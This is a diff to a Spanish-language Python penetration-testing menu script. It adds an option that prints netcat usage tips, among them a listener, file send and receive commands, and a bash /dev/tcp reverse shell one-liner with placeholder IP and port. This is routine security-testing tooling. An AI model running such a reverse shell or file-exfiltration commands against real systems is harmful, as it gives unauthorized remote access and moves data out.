@@ -379,6 +379,16 @@ def escaneo_searchsploit(servicio):
             print(f"Resultados guardados en: {salida}")
         except subprocess.CalledProcessError as e:
             print(f"Error al ejecutar Searchsploit: {e}")
+def escaneo_netcat():
+    print("""
+Opciones rápidas con Netcat:
+1. Probar conectividad a un puerto: nc <IP> <PUERTO>
+2. Escuchar en un puerto: nc -lvnp <PUERTO>
+3. Enviar un archivo: nc <IP> <PUERTO> < archivo
+4. Recibir un archivo: nc -lvnp <PUERTO> > archivo
+5. Shell reversa (Linux): bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1
+Puedes ejecutar estos comandos manualmente en otra terminal.
+""")
 def mostrar_ayuda():
     print(""")
 Opciones de escaneo con Nmap y herramientas relacionadas:
@@ -410,6 +420,7 @@ Opciones de escaneo con Nmap y herramientas relacionadas:
 26. Fuzzing de directorios y parametros web con Wfuzz (usa FUZZ en la URL)
 27. Fuzzing de directorios y archivos web con FFUF
 28. Busqueda de exploits locales con Searchsploit
+29. Comandos útiles de Netcat
 h. Mostrar esta ayuda
 """)
 if __name__ == "__main__":
@@ -554,5 +565,7 @@ elif opcion == "28":
     servicio = input("Servicio, versión o palabra clave a buscar en Searchsploit: ")
     escaneo_searchsploit(servicio)
 
+elif opcion == "29":
+    escaneo_netcat()
 else:
-    print("Opción no válida.")
+    print("Opción no válida.")   
